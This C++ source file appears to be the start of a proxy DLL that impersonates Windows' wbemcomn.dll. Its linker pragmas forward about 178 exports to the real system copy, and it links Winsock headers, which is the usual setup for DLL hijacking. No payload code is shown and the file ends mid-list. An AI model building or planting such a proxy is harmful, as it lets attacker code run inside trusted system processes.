#pragma comment(lib, "ws2_32")

#include "stdafx.h"

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <winsock2.h>
#include <tchar.h>
#include <cstdlib>
#include <stdio.h>
#include <sddl.h>

#pragma comment (linker, "/export:??0?$CLockableFlexArray@VCStaticCritSec@@@@QEAA@AEAV0@@Z=c:/windows/system32/wbemcomn.??0?$CLockableFlexArray@VCStaticCritSec@@@@QEAA@AEAV0@@Z,@1")
#pragma comment (linker, "/export:??0?$CLockableFlexArray@VCStaticCritSec@@@@QEAA@XZ=c:/windows/system32/wbemcomn.??0?$CLockableFlexArray@VCStaticCritSec@@@@QEAA@XZ,@2")
#pragma comment (linker, "/export:??0?$SZLess@PEBG@@QEAA@AEBU0@@Z=c:/windows/system32/wbemcomn.??0?$SZLess@PEBG@@QEAA@AEBU0@@Z,@3")
#pragma comment (linker, "/export:??0?$SZLess@PEBG@@QEAA@XZ=c:/windows/system32/wbemcomn.??0?$SZLess@PEBG@@QEAA@XZ,@4")
#pragma comment (linker, "/export:??0C9XAce@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0C9XAce@@QEAA@AEBV0@@Z,@5")
#pragma comment (linker, "/export:??0C9XAce@@QEAA@KKKPEAG@Z=c:/windows/system32/wbemcomn.??0C9XAce@@QEAA@KKKPEAG@Z,@6")
#pragma comment (linker, "/export:??0C9XAce@@QEAA@XZ=c:/windows/system32/wbemcomn.??0C9XAce@@QEAA@XZ,@7")
#pragma comment (linker, "/export:??0CAbstractQl1Parser@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CAbstractQl1Parser@@QEAA@AEBV0@@Z,@8")
#pragma comment (linker, "/export:??0CAbstractQl1Parser@@QEAA@PEAVCGenLexSource@@@Z=c:/windows/system32/wbemcomn.??0CAbstractQl1Parser@@QEAA@PEAVCGenLexSource@@@Z,@9")
#pragma comment (linker, "/export:??0CArena@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CArena@@QEAA@AEBV0@@Z,@10")
#pragma comment (linker, "/export:??0CArena@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CArena@@QEAA@XZ,@11")
#pragma comment (linker, "/export:??0CBaseAce@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CBaseAce@@QEAA@AEBV0@@Z,@12")
#pragma comment (linker, "/export:??0CBaseAce@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CBaseAce@@QEAA@XZ,@13")
#pragma comment (linker, "/export:??0CBasicUnloadInstruction@@IEAA@XZ=c:/windows/system32/wbemcomn.??0CBasicUnloadInstruction@@IEAA@XZ,@14")
#pragma comment (linker, "/export:??0CBasicUnloadInstruction@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CBasicUnloadInstruction@@QEAA@AEBV0@@Z,@15")
#pragma comment (linker, "/export:??0CBasicUnloadInstruction@@QEAA@VCWbemInterval@@@Z=c:/windows/system32/wbemcomn.??0CBasicUnloadInstruction@@QEAA@VCWbemInterval@@@Z,@16")
#pragma comment (linker, "/export:??0CBuffer@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CBuffer@@QEAA@AEBV0@@Z,@17")
#pragma comment (linker, "/export:??0CBuffer@@QEAA@PEAEKH@Z=c:/windows/system32/wbemcomn.??0CBuffer@@QEAA@PEAEKH@Z,@18")
#pragma comment (linker, "/export:??0CCheckedInCritSec@@QEAA@PEAVCCritSec@@@Z=c:/windows/system32/wbemcomn.??0CCheckedInCritSec@@QEAA@PEAVCCritSec@@@Z,@19")
#pragma comment (linker, "/export:??0CCircularQueue@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CCircularQueue@@QEAA@XZ,@20")
#pragma comment (linker, "/export:??0CClientOpsNode@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CClientOpsNode@@QEAA@XZ,@21")
#pragma comment (linker, "/export:??0CContainerControl@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CContainerControl@@QEAA@AEBV0@@Z,@22")
#pragma comment (linker, "/export:??0CContainerControl@@QEAA@PEAUIUnknown@@@Z=c:/windows/system32/wbemcomn.??0CContainerControl@@QEAA@PEAUIUnknown@@@Z,@23")
#pragma comment (linker, "/export:??0CCritSec@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CCritSec@@QEAA@XZ,@24")
#pragma comment (linker, "/export:??0CDMTFParser@@QEAA@PEBG@Z=c:/windows/system32/wbemcomn.??0CDMTFParser@@QEAA@PEBG@Z,@25")
#pragma comment (linker, "/export:??0CDatePart@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CDatePart@@QEAA@XZ,@26")
#pragma comment (linker, "/export:??0CDateTimeParser@@IEAA@XZ=c:/windows/system32/wbemcomn.??0CDateTimeParser@@IEAA@XZ,@27")
#pragma comment (linker, "/export:??0CDateTimeParser@@QEAA@PEBG@Z=c:/windows/system32/wbemcomn.??0CDateTimeParser@@QEAA@PEBG@Z,@28")
#pragma comment (linker, "/export:??0CEnterWbemCriticalSection@@QEAA@PEAVCWbemCriticalSection@@K@Z=c:/windows/system32/wbemcomn.??0CEnterWbemCriticalSection@@QEAA@PEAVCWbemCriticalSection@@K@Z,@29")
#pragma comment (linker, "/export:??0CEventLog@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CEventLog@@QEAA@AEBV0@@Z,@30")
#pragma comment (linker, "/export:??0CEventLog@@QEAA@PEBGAEBU_GUID@@K@Z=c:/windows/system32/wbemcomn.??0CEventLog@@QEAA@PEBGAEBU_GUID@@K@Z,@31")
#pragma comment (linker, "/export:??0CEventLogRecord@@QEAA@AEAV0@@Z=c:/windows/system32/wbemcomn.??0CEventLogRecord@@QEAA@AEAV0@@Z,@32")
#pragma comment (linker, "/export:??0CEventLogRecord@@QEAA@GAEBU_EVENT_DESCRIPTOR@@VCInsertionString@@111111111@Z=c:/windows/system32/wbemcomn.??0CEventLogRecord@@QEAA@GAEBU_EVENT_DESCRIPTOR@@VCInsertionString@@111111111@Z,@33")
#pragma comment (linker, "/export:??0CExecQueue@@QEAA@AEAV0@@Z=c:/windows/system32/wbemcomn.??0CExecQueue@@QEAA@AEAV0@@Z,@34")
#pragma comment (linker, "/export:??0CExecQueue@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CExecQueue@@QEAA@XZ,@35")
#pragma comment (linker, "/export:??0CExecRequest@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CExecRequest@@QEAA@AEBV0@@Z,@36")
#pragma comment (linker, "/export:??0CExecRequest@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CExecRequest@@QEAA@XZ,@37")
#pragma comment (linker, "/export:??0CFlexArray@@QEAA@AEAV0@@Z=c:/windows/system32/wbemcomn.??0CFlexArray@@QEAA@AEAV0@@Z,@38")
#pragma comment (linker, "/export:??0CFlexArray@@QEAA@HH@Z=c:/windows/system32/wbemcomn.??0CFlexArray@@QEAA@HH@Z,@39")
#pragma comment (linker, "/export:??0CFlexQueue@@QEAA@H@Z=c:/windows/system32/wbemcomn.??0CFlexQueue@@QEAA@H@Z,@40")
#pragma comment (linker, "/export:??0CHaltable@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CHaltable@@QEAA@AEBV0@@Z,@41")
#pragma comment (linker, "/export:??0CHaltable@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CHaltable@@QEAA@XZ,@42")
#pragma comment (linker, "/export:??0CHex@@QEAA@J@Z=c:/windows/system32/wbemcomn.??0CHex@@QEAA@J@Z,@43")
#pragma comment (linker, "/export:??0CIdentitySecurity@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CIdentitySecurity@@QEAA@AEBV0@@Z,@44")
#pragma comment (linker, "/export:??0CIdentitySecurity@@QEAA@_N@Z=c:/windows/system32/wbemcomn.??0CIdentitySecurity@@QEAA@_N@Z,@45")
#pragma comment (linker, "/export:??0CIdentityTest@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CIdentityTest@@QEAA@AEBV0@@Z,@46")
#pragma comment (linker, "/export:??0CIdentityTest@@QEAA@PEAVCTimerInstruction@@@Z=c:/windows/system32/wbemcomn.??0CIdentityTest@@QEAA@PEAVCTimerInstruction@@@Z,@47")
#pragma comment (linker, "/export:??0CInCritSec@@QEAA@PEAU_RTL_CRITICAL_SECTION@@@Z=c:/windows/system32/wbemcomn.??0CInCritSec@@QEAA@PEAU_RTL_CRITICAL_SECTION@@@Z,@48")
#pragma comment (linker, "/export:??0CInsertionString@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CInsertionString@@QEAA@AEBV0@@Z,@49")
#pragma comment (linker, "/export:??0CInsertionString@@QEAA@J@Z=c:/windows/system32/wbemcomn.??0CInsertionString@@QEAA@J@Z,@50")
#pragma comment (linker, "/export:??0CInsertionString@@QEAA@PEBD@Z=c:/windows/system32/wbemcomn.??0CInsertionString@@QEAA@PEBD@Z,@51")
#pragma comment (linker, "/export:??0CInsertionString@@QEAA@PEBG@Z=c:/windows/system32/wbemcomn.??0CInsertionString@@QEAA@PEBG@Z,@52")
#pragma comment (linker, "/export:??0CInsertionString@@QEAA@VCHex@@@Z=c:/windows/system32/wbemcomn.??0CInsertionString@@QEAA@VCHex@@@Z,@53")
#pragma comment (linker, "/export:??0CInsertionString@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CInsertionString@@QEAA@XZ,@54")
#pragma comment (linker, "/export:??0CInstructionQueue@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CInstructionQueue@@QEAA@XZ,@55")
#pragma comment (linker, "/export:??0CInstructionTest@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CInstructionTest@@QEAA@AEBV0@@Z,@56")
#pragma comment (linker, "/export:??0CInstructionTest@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CInstructionTest@@QEAA@XZ,@57")
#pragma comment (linker, "/export:??0CLifeControl@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CLifeControl@@QEAA@AEBV0@@Z,@58")
#pragma comment (linker, "/export:??0CLifeControl@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CLifeControl@@QEAA@XZ,@59")
#pragma comment (linker, "/export:??0CLike@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CLike@@QEAA@AEBV0@@Z,@60")
#pragma comment (linker, "/export:??0CLike@@QEAA@PEBGG@Z=c:/windows/system32/wbemcomn.??0CLike@@QEAA@PEBGG@Z,@61")
#pragma comment (linker, "/export:??0CLike@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CLike@@QEAA@XZ,@62")
#pragma comment (linker, "/export:??0CLimitControl@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CLimitControl@@QEAA@AEBV0@@Z,@63")
#pragma comment (linker, "/export:??0CLimitControl@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CLimitControl@@QEAA@XZ,@64")
#pragma comment (linker, "/export:??0CMRCICompression@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CMRCICompression@@QEAA@XZ,@65")
#pragma comment (linker, "/export:??0CMRCIControl@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CMRCIControl@@QEAA@XZ,@66")
#pragma comment (linker, "/export:??0CMUILocaleList@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CMUILocaleList@@QEAA@XZ,@67")
#pragma comment (linker, "/export:??0CMemoryLog@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CMemoryLog@@QEAA@XZ,@68")
#pragma comment (linker, "/export:??0CMinMaxLimitControl@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CMinMaxLimitControl@@QEAA@AEBV0@@Z,@69")
#pragma comment (linker, "/export:??0CMinMaxLimitControl@@QEAA@HPEBG@Z=c:/windows/system32/wbemcomn.??0CMinMaxLimitControl@@QEAA@HPEBG@Z,@70")
#pragma comment (linker, "/export:??0CNtAce@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CNtAce@@QEAA@AEBV0@@Z,@71")
#pragma comment (linker, "/export:??0CNtAce@@QEAA@KKKAEAVCNtSid@@@Z=c:/windows/system32/wbemcomn.??0CNtAce@@QEAA@KKKAEAVCNtSid@@@Z,@72")
#pragma comment (linker, "/export:??0CNtAce@@QEAA@KKKPEAG@Z=c:/windows/system32/wbemcomn.??0CNtAce@@QEAA@KKKPEAG@Z,@73")
#pragma comment (linker, "/export:??0CNtAce@@QEAA@PEAU_ACCESS_ALLOWED_ACE@@@Z=c:/windows/system32/wbemcomn.??0CNtAce@@QEAA@PEAU_ACCESS_ALLOWED_ACE@@@Z,@74")
#pragma comment (linker, "/export:??0CNtAce@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CNtAce@@QEAA@XZ,@75")
#pragma comment (linker, "/export:??0CNtAcl@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CNtAcl@@QEAA@AEBV0@@Z,@76")
#pragma comment (linker, "/export:??0CNtAcl@@QEAA@K@Z=c:/windows/system32/wbemcomn.??0CNtAcl@@QEAA@K@Z,@77")
#pragma comment (linker, "/export:??0CNtAcl@@QEAA@PEAU_ACL@@@Z=c:/windows/system32/wbemcomn.??0CNtAcl@@QEAA@PEAU_ACL@@@Z,@78")
#pragma comment (linker, "/export:??0CNtSecurityDescriptor@@QEAA@AEAV0@@Z=c:/windows/system32/wbemcomn.??0CNtSecurityDescriptor@@QEAA@AEAV0@@Z,@79")
#pragma comment (linker, "/export:??0CNtSecurityDescriptor@@QEAA@PEAX@Z=c:/windows/system32/wbemcomn.??0CNtSecurityDescriptor@@QEAA@PEAX@Z,@80")
#pragma comment (linker, "/export:??0CNtSecurityDescriptor@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CNtSecurityDescriptor@@QEAA@XZ,@81")
#pragma comment (linker, "/export:??0CNtSid@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CNtSid@@QEAA@AEBV0@@Z,@82")
#pragma comment (linker, "/export:??0CNtSid@@QEAA@PEAG@Z=c:/windows/system32/wbemcomn.??0CNtSid@@QEAA@PEAG@Z,@83")
#pragma comment (linker, "/export:??0CNtSid@@QEAA@PEAX@Z=c:/windows/system32/wbemcomn.??0CNtSid@@QEAA@PEAX@Z,@84")
#pragma comment (linker, "/export:??0CNtSid@@QEAA@W4SidType@0@@Z=c:/windows/system32/wbemcomn.??0CNtSid@@QEAA@W4SidType@0@@Z,@85")
#pragma comment (linker, "/export:??0CNtSid@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CNtSid@@QEAA@XZ,@86")
#pragma comment (linker, "/export:??0CPropertyName@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CPropertyName@@QEAA@AEBV0@@Z,@87")
#pragma comment (linker, "/export:??0CPropertyName@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CPropertyName@@QEAA@XZ,@88")
#pragma comment (linker, "/export:??0CQl1ParseSink@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CQl1ParseSink@@QEAA@AEBV0@@Z,@89")
#pragma comment (linker, "/export:??0CQl1ParseSink@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CQl1ParseSink@@QEAA@XZ,@90")
#pragma comment (linker, "/export:??0CRegistryMinMaxLimitControl@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CRegistryMinMaxLimitControl@@QEAA@AEBV0@@Z,@91")
#pragma comment (linker, "/export:??0CRegistryMinMaxLimitControl@@QEAA@HPEBG0000@Z=c:/windows/system32/wbemcomn.??0CRegistryMinMaxLimitControl@@QEAA@HPEBG0000@Z,@92")
#pragma comment (linker, "/export:??0CSafeArray@@QEAA@AEAV0@@Z=c:/windows/system32/wbemcomn.??0CSafeArray@@QEAA@AEAV0@@Z,@93")
#pragma comment (linker, "/export:??0CSafeArray@@QEAA@HHHH@Z=c:/windows/system32/wbemcomn.??0CSafeArray@@QEAA@HHHH@Z,@94")
#pragma comment (linker, "/export:??0CSafeArray@@QEAA@PEAUtagSAFEARRAY@@HHH@Z=c:/windows/system32/wbemcomn.??0CSafeArray@@QEAA@PEAUtagSAFEARRAY@@HHH@Z,@95")
#pragma comment (linker, "/export:??0CStaticCritSec@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CStaticCritSec@@QEAA@XZ,@96")
#pragma comment (linker, "/export:??0CTextTemplate@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CTextTemplate@@QEAA@AEBV0@@Z,@97")
#pragma comment (linker, "/export:??0CTextTemplate@@QEAA@PEBG@Z=c:/windows/system32/wbemcomn.??0CTextTemplate@@QEAA@PEBG@Z,@98")
#pragma comment (linker, "/export:??0CTimerGenerator@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CTimerGenerator@@QEAA@AEBV0@@Z,@99")
#pragma comment (linker, "/export:??0CTimerGenerator@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CTimerGenerator@@QEAA@XZ,@100")
#pragma comment (linker, "/export:??0CTimerInstruction@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CTimerInstruction@@QEAA@AEBV0@@Z,@101")
#pragma comment (linker, "/export:??0CTimerInstruction@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CTimerInstruction@@QEAA@XZ,@102")
#pragma comment (linker, "/export:??0CTraceSessionControl@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CTraceSessionControl@@QEAA@XZ,@103")
#pragma comment (linker, "/export:??0CUnk@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CUnk@@QEAA@AEBV0@@Z,@104")
#pragma comment (linker, "/export:??0CUnk@@QEAA@PEAVCLifeControl@@PEAUIUnknown@@@Z=c:/windows/system32/wbemcomn.??0CUnk@@QEAA@PEAVCLifeControl@@PEAUIUnknown@@@Z,@105")
#pragma comment (linker, "/export:??0CUnkInternal@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CUnkInternal@@QEAA@AEBV0@@Z,@106")
#pragma comment (linker, "/export:??0CUnkInternal@@QEAA@PEAVCLifeControl@@@Z=c:/windows/system32/wbemcomn.??0CUnkInternal@@QEAA@PEAVCLifeControl@@@Z,@107")
#pragma comment (linker, "/export:??0CVar@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CVar@@QEAA@AEBV0@@Z,@108")
#pragma comment (linker, "/export:??0CVar@@QEAA@D@Z=c:/windows/system32/wbemcomn.??0CVar@@QEAA@D@Z,@109")
#pragma comment (linker, "/export:??0CVar@@QEAA@E@Z=c:/windows/system32/wbemcomn.??0CVar@@QEAA@E@Z,@110")
#pragma comment (linker, "/export:??0CVar@@QEAA@F@Z=c:/windows/system32/wbemcomn.??0CVar@@QEAA@F@Z,@111")
#pragma comment (linker, "/export:??0CVar@@QEAA@FH@Z=c:/windows/system32/wbemcomn.??0CVar@@QEAA@FH@Z,@112")
#pragma comment (linker, "/export:??0CVar@@QEAA@G@Z=c:/windows/system32/wbemcomn.??0CVar@@QEAA@G@Z,@113")
#pragma comment (linker, "/export:??0CVar@@QEAA@HPEAG@Z=c:/windows/system32/wbemcomn.??0CVar@@QEAA@HPEAG@Z,@114")
#pragma comment (linker, "/export:??0CVar@@QEAA@HPEAUtagSAFEARRAY@@@Z=c:/windows/system32/wbemcomn.??0CVar@@QEAA@HPEAUtagSAFEARRAY@@@Z,@115")
#pragma comment (linker, "/export:??0CVar@@QEAA@HVauto_bstr@@@Z=c:/windows/system32/wbemcomn.??0CVar@@QEAA@HVauto_bstr@@@Z,@116")
#pragma comment (linker, "/export:??0CVar@@QEAA@J@Z=c:/windows/system32/wbemcomn.??0CVar@@QEAA@J@Z,@117")
#pragma comment (linker, "/export:??0CVar@@QEAA@K@Z=c:/windows/system32/wbemcomn.??0CVar@@QEAA@K@Z,@118")
#pragma comment (linker, "/export:??0CVar@@QEAA@M@Z=c:/windows/system32/wbemcomn.??0CVar@@QEAA@M@Z,@119")
#pragma comment (linker, "/export:??0CVar@@QEAA@N@Z=c:/windows/system32/wbemcomn.??0CVar@@QEAA@N@Z,@120")
#pragma comment (linker, "/export:??0CVar@@QEAA@PEADH@Z=c:/windows/system32/wbemcomn.??0CVar@@QEAA@PEADH@Z,@121")
#pragma comment (linker, "/export:??0CVar@@QEAA@PEAGH@Z=c:/windows/system32/wbemcomn.??0CVar@@QEAA@PEAGH@Z,@122")
#pragma comment (linker, "/export:??0CVar@@QEAA@PEAU_FILETIME@@@Z=c:/windows/system32/wbemcomn.??0CVar@@QEAA@PEAU_FILETIME@@@Z,@123")
#pragma comment (linker, "/export:??0CVar@@QEAA@PEAU_GUID@@H@Z=c:/windows/system32/wbemcomn.??0CVar@@QEAA@PEAU_GUID@@H@Z,@124")
#pragma comment (linker, "/export:??0CVar@@QEAA@PEAUtagBLOB@@H@Z=c:/windows/system32/wbemcomn.??0CVar@@QEAA@PEAUtagBLOB@@H@Z,@125")
#pragma comment (linker, "/export:??0CVar@@QEAA@PEAUtagVARIANT@@@Z=c:/windows/system32/wbemcomn.??0CVar@@QEAA@PEAUtagVARIANT@@@Z,@126")
#pragma comment (linker, "/export:??0CVar@@QEAA@PEAVCVarVector@@H@Z=c:/windows/system32/wbemcomn.??0CVar@@QEAA@PEAVCVarVector@@H@Z,@127")
#pragma comment (linker, "/export:??0CVar@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CVar@@QEAA@XZ,@128")
#pragma comment (linker, "/export:??0CVarVector@@QEAA@AEAV0@@Z=c:/windows/system32/wbemcomn.??0CVarVector@@QEAA@AEAV0@@Z,@129")
#pragma comment (linker, "/export:??0CVarVector@@QEAA@HHH@Z=c:/windows/system32/wbemcomn.??0CVarVector@@QEAA@HHH@Z,@130")
#pragma comment (linker, "/export:??0CVarVector@@QEAA@HPEAUtagSAFEARRAY@@H@Z=c:/windows/system32/wbemcomn.??0CVarVector@@QEAA@HPEAUtagSAFEARRAY@@H@Z,@131")
#pragma comment (linker, "/export:??0CVarVector@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CVarVector@@QEAA@XZ,@132")
#pragma comment (linker, "/export:??0CWMITraceSettings@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CWMITraceSettings@@QEAA@XZ,@133")
#pragma comment (linker, "/export:??0CWQLScanner@@QEAA@AEAV0@@Z=c:/windows/system32/wbemcomn.??0CWQLScanner@@QEAA@AEAV0@@Z,@134")
#pragma comment (linker, "/export:??0CWQLScanner@@QEAA@PEAVCGenLexSource@@@Z=c:/windows/system32/wbemcomn.??0CWQLScanner@@QEAA@PEAVCGenLexSource@@@Z,@135")
#pragma comment (linker, "/export:??0CWStringArray@@QEAA@AEAV0@@Z=c:/windows/system32/wbemcomn.??0CWStringArray@@QEAA@AEAV0@@Z,@136")
#pragma comment (linker, "/export:??0CWStringArray@@QEAA@HH@Z=c:/windows/system32/wbemcomn.??0CWStringArray@@QEAA@HH@Z,@137")
#pragma comment (linker, "/export:??0CWbemCallSecurity@@AEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CWbemCallSecurity@@AEAA@AEBV0@@Z,@138")
#pragma comment (linker, "/export:??0CWbemCallSecurity@@AEAA@XZ=c:/windows/system32/wbemcomn.??0CWbemCallSecurity@@AEAA@XZ,@139")
#pragma comment (linker, "/export:??0CWbemCriticalSection@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CWbemCriticalSection@@QEAA@XZ,@140")
#pragma comment (linker, "/export:??0CWbemInstallObject@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CWbemInstallObject@@QEAA@XZ,@141")
#pragma comment (linker, "/export:??0CWbemInterval@@IEAA@K@Z=c:/windows/system32/wbemcomn.??0CWbemInterval@@IEAA@K@Z,@142")
#pragma comment (linker, "/export:??0CWbemInterval@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CWbemInterval@@QEAA@XZ,@143")
#pragma comment (linker, "/export:??0CWbemTime@@IEAA@_J@Z=c:/windows/system32/wbemcomn.??0CWbemTime@@IEAA@_J@Z,@144")
#pragma comment (linker, "/export:??0CWbemTime@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CWbemTime@@QEAA@AEBV0@@Z,@145")
#pragma comment (linker, "/export:??0CWbemTime@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CWbemTime@@QEAA@XZ,@146")
#pragma comment (linker, "/export:??0CWbemTimeSpan@@QEAA@HHHHHHH@Z=c:/windows/system32/wbemcomn.??0CWbemTimeSpan@@QEAA@HHHHHHH@Z,@147")
#pragma comment (linker, "/export:??0CWin32DefaultArena@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0CWin32DefaultArena@@QEAA@AEBV0@@Z,@148")
#pragma comment (linker, "/export:??0CWin32DefaultArena@@QEAA@XZ=c:/windows/system32/wbemcomn.??0CWin32DefaultArena@@QEAA@XZ,@149")
#pragma comment (linker, "/export:??0QL1_Parser@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0QL1_Parser@@QEAA@AEBV0@@Z,@150")
#pragma comment (linker, "/export:??0QL1_Parser@@QEAA@PEAVCGenLexSource@@@Z=c:/windows/system32/wbemcomn.??0QL1_Parser@@QEAA@PEAVCGenLexSource@@@Z,@151")
#pragma comment (linker, "/export:??0QL_LEVEL_1_RPN_EXPRESSION@@QEAA@AEBU0@@Z=c:/windows/system32/wbemcomn.??0QL_LEVEL_1_RPN_EXPRESSION@@QEAA@AEBU0@@Z,@152")
#pragma comment (linker, "/export:??0QL_LEVEL_1_RPN_EXPRESSION@@QEAA@XZ=c:/windows/system32/wbemcomn.??0QL_LEVEL_1_RPN_EXPRESSION@@QEAA@XZ,@153")
#pragma comment (linker, "/export:??0QL_LEVEL_1_TOKEN@@QEAA@AEBU0@@Z=c:/windows/system32/wbemcomn.??0QL_LEVEL_1_TOKEN@@QEAA@AEBU0@@Z,@154")
#pragma comment (linker, "/export:??0QL_LEVEL_1_TOKEN@@QEAA@XZ=c:/windows/system32/wbemcomn.??0QL_LEVEL_1_TOKEN@@QEAA@XZ,@155")
#pragma comment (linker, "/export:??0Registry@@QEAA@PEAUHKEY__@@KKPEBG@Z=c:/windows/system32/wbemcomn.??0Registry@@QEAA@PEAUHKEY__@@KKPEBG@Z,@156")
#pragma comment (linker, "/export:??0Registry@@QEAA@PEAUHKEY__@@KPEBG@Z=c:/windows/system32/wbemcomn.??0Registry@@QEAA@PEAUHKEY__@@KPEBG@Z,@157")
#pragma comment (linker, "/export:??0Registry@@QEAA@PEBGK@Z=c:/windows/system32/wbemcomn.??0Registry@@QEAA@PEBGK@Z,@158")
#pragma comment (linker, "/export:??0Registry@@QEAA@XZ=c:/windows/system32/wbemcomn.??0Registry@@QEAA@XZ,@159")
#pragma comment (linker, "/export:??0WString2@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0WString2@@QEAA@AEBV0@@Z,@160")
#pragma comment (linker, "/export:??0WString2@@QEAA@KPEAUHINSTANCE__@@@Z=c:/windows/system32/wbemcomn.??0WString2@@QEAA@KPEAUHINSTANCE__@@@Z,@161")
#pragma comment (linker, "/export:??0WString2@@QEAA@PEAGH@Z=c:/windows/system32/wbemcomn.??0WString2@@QEAA@PEAGH@Z,@162")
#pragma comment (linker, "/export:??0WString2@@QEAA@PEBD@Z=c:/windows/system32/wbemcomn.??0WString2@@QEAA@PEBD@Z,@163")
#pragma comment (linker, "/export:??0WString2@@QEAA@PEBG@Z=c:/windows/system32/wbemcomn.??0WString2@@QEAA@PEBG@Z,@164")
#pragma comment (linker, "/export:??0WString2@@QEAA@XZ=c:/windows/system32/wbemcomn.??0WString2@@QEAA@XZ,@165")
#pragma comment (linker, "/export:??0WString2@@QEAA@_K@Z=c:/windows/system32/wbemcomn.??0WString2@@QEAA@_K@Z,@166")
#pragma comment (linker, "/export:??0WString@@QEAA@AEBV0@@Z=c:/windows/system32/wbemcomn.??0WString@@QEAA@AEBV0@@Z,@167")
#pragma comment (linker, "/export:??0WString@@QEAA@KPEAUHINSTANCE__@@@Z=c:/windows/system32/wbemcomn.??0WString@@QEAA@KPEAUHINSTANCE__@@@Z,@168")
#pragma comment (linker, "/export:??0WString@@QEAA@PEAGH@Z=c:/windows/system32/wbemcomn.??0WString@@QEAA@PEAGH@Z,@169")
#pragma comment (linker, "/export:??0WString@@QEAA@PEBD@Z=c:/windows/system32/wbemcomn.??0WString@@QEAA@PEBD@Z,@170")
#pragma comment (linker, "/export:??0WString@@QEAA@PEBG@Z=c:/windows/system32/wbemcomn.??0WString@@QEAA@PEBG@Z,@171")
#pragma comment (linker, "/export:??0WString@@QEAA@XZ=c:/windows/system32/wbemcomn.??0WString@@QEAA@XZ,@172")
#pragma comment (linker, "/export:??1?$CLockableFlexArray@VCStaticCritSec@@@@QEAA@XZ=c:/windows/system32/wbemcomn.??1?$CLockableFlexArray@VCStaticCritSec@@@@QEAA@XZ,@173")
#pragma comment (linker, "/export:??1?$SZLess@PEBG@@UEAA@XZ=c:/windows/system32/wbemcomn.??1?$SZLess@PEBG@@UEAA@XZ,@174")
#pragma comment (linker, "/export:??1C9XAce@@UEAA@XZ=c:/windows/system32/wbemcomn.??1C9XAce@@UEAA@XZ,@175")
#pragma comment (linker, "/export:??1CAbstractQl1Parser@@UEAA@XZ=c:/windows/system32/wbemcomn.??1CAbstractQl1Parser@@UEAA@XZ,@176")
#pragma comment (linker, "/export:??1CBaseAce@@UEAA@XZ=c:/windows/system32/wbemcomn.??1CBaseAce@@UEAA@XZ,@177")
#pragma comment (linker, "/export:??1CBasicUnloadInstruction@@UEAA@XZ=c:/windows/system32/wbemcomn.??1CBasicUnloadInstruction@@UEAA@XZ,@178")
